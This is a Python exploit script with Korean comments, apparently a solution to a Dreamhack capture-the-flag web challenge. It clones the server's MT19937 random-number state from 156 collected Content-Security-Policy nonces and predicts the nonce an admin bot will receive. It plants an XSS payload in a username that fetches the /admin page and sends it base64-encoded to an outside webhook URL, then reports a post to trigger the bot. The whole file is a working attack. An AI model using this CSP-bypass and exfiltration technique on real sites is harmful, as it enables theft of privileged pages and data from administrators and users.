import requests
from randcrack import RandCrack
import re
import random
import string

# 타겟 및 웹훅 설정
TARGET_URL = "http://host8.dreamhack.games:14367"
WEBHOOK_URL = "https://webhooksite.net/5c337e9e-4316-4545-983b-ab895c23b065"

print(f"==================================================")
print(f"[+] 타겟 URL: {TARGET_URL}")
print(f"[+] 웹훅 URL: {WEBHOOK_URL}")
print(f"==================================================\n")

# --- [Phase 1: PRNG 상태 복제용 더미 계정] ---
s1 = requests.Session()
dummy_user = f"dummy_{''.join(random.choices(string.ascii_lowercase + string.digits, k=5))}"

print(f"[*] 1단계: 난수 수집용 더미 계정 회원가입/로그인 (아이디: {dummy_user})")
s1.post(f"{TARGET_URL}/register", data={'newUsername': dummy_user, 'newPassword': 'pw'}, allow_redirects=False)
s1.post(f"{TARGET_URL}/login", data={'username': dummy_user, 'password': 'pw'}, allow_redirects=False)

print("\n[*] 2단계: PRNG(MT19937) 상태 복제를 위해 156개의 Nonce 수집 시작...")
rc = RandCrack()
nonces = []
for i in range(156):
    r = s1.get(f"{TARGET_URL}/login", allow_redirects=False)
    nonce = r.headers.get('Content-Security-Policy').split("nonce-")[1].split("'")[0]
    nonces.append(nonce)

print("\n[*] 3단계: 수집한 Nonce 파싱 및 RandCrack에 동기화...")
for nonce in nonces:
    rc.submit(int(nonce[24:32], 16))
    rc.submit(int(nonce[16:24], 16))
    rc.submit(int(nonce[8:16], 16))
    rc.submit(int(nonce[0:8], 16))
print("  [-] RandCrack 내부 상태 동기화 완료!")

def get_next_nonce(rc):
    n = 0
    for i in range(4):
        n |= (rc.predict_getrandbits(32)) << (32 * i)
    return hex(n)[2:].zfill(32)

future_nonces = [get_next_nonce(rc) for _ in range(20)]

# 상태 검증
dummy_r = s1.get(f"{TARGET_URL}/login", allow_redirects=False)
actual_dummy_nonce = dummy_r.headers.get('Content-Security-Policy').split("nonce-")[1].split("'")[0]
offset = future_nonces.index(actual_dummy_nonce)
print(f"\n[*] 4단계: 난수 오프셋 동기화 검증 -> [+] 서버 상태 확인됨! (오프셋: {offset})")

# --- [Phase 2: XSS 페이로드 계정 생성 및 공격] ---
# 앞으로 발생할 요청들에 매핑될 Nonce 예측
n_reg    = future_nonces[offset + 1] # 공격 계정 가입 시 소모됨
n_login  = future_nonces[offset + 2] # 공격 계정 로그인 시 소모됨
n_create = future_nonces[offset + 3] # 글 작성 시 소모됨
n_index  = future_nonces[offset + 4] # 글 ID 확인차 메인 조회 시 소모됨
n_admin  = future_nonces[offset + 5] # ★ Admin Bot이 /reports 렌더링 시 소모될 타겟 Nonce!
n_report = future_nonces[offset + 6] # 신고 후 우리에게 응답될 때 소모됨

print(f"\n[*] 5단계: XSS 계정 생성 (아이디에 페이로드 주입)")
payload = f"<script nonce='{n_admin}'>fetch('/admin').then(r=>r.text()).then(t=>location.href='{WEBHOOK_URL}?c='+btoa(t));</script>"
print(f"  [-] 페이로드 길이: {len(payload)}자 (255자 이하 OK)")
print(f"  [-] 주입될 타겟 Nonce: {n_admin}")

s2 = requests.Session()

# 1. 가입 (Account 2)
r_reg = s2.post(f"{TARGET_URL}/register", data={'newUsername': payload, 'newPassword': 'pw'}, allow_redirects=False)
print(f"\n  [Expected] /register : {n_reg}")
print(f"  [Actual  ] /register : {r_reg.headers.get('Content-Security-Policy').split('nonce-')[1].split('\'')[0]}")

# 2. 로그인 (Account 2)
r_login = s2.post(f"{TARGET_URL}/login", data={'username': payload, 'password': 'pw'}, allow_redirects=False)
print(f"  [Expected] /login    : {n_login}")
print(f"  [Actual  ] /login    : {r_login.headers.get('Content-Security-Policy').split('nonce-')[1].split('\'')[0]}")

# 3. 글 작성 (아무 내용이나)
r_create = s2.post(f"{TARGET_URL}/create_post", data={'postText': 'Trigger Admin!'}, allow_redirects=False)
print(f"  [Expected] /create   : {n_create}")
print(f"  [Actual  ] /create   : {r_create.headers.get('Content-Security-Policy').split('nonce-')[1].split('\'')[0]}")

# 4. 글 ID 찾기
r_index = s2.get(f"{TARGET_URL}/", allow_redirects=False)
print(f"  [Expected] / (Index) : {n_index}")
print(f"  [Actual  ] / (Index) : {r_index.headers.get('Content-Security-Policy').split('nonce-')[1].split('\'')[0]}")

ids = [int(x) for x in re.findall(r'value="(\d+)"', r_index.text)]
target_post_id = str(max(ids)) if ids else "1"
print(f"  [-] 최종 타겟 post_id 확정: {target_post_id}")

# 5. 신고하기 (이 순간 내부적으로 Admin Bot이 구동되어 n_admin을 소비함)
print(f"\n[*] 6단계: Admin Bot 트리거를 위한 글 신고...")
r_report = s2.post(f"{TARGET_URL}/report_post", data={'post_id': target_post_id}, allow_redirects=False)

# 참고: Flask 내부에서 Admin의 GET /reports 가 먼저 끝나고 응답하므로 n_admin을 선점하고, 
# 그 다음 우리의 POST /report_post 가 리턴되면서 n_report 를 소모하게 됩니다.
print(f"  [Expected] /report   : {n_report}")
print(f"  [Actual  ] /report   : {r_report.headers.get('Content-Security-Policy').split('nonce-')[1].split('\'')[0]}")

print("\n==================================================")
print("[+] 익스플로잇 완료! Expected와 Actual이 모두 일치했다면")
print("    웹훅에 10초 이내로 달달한 플래그가 도착할 거야!")
print("==================================================")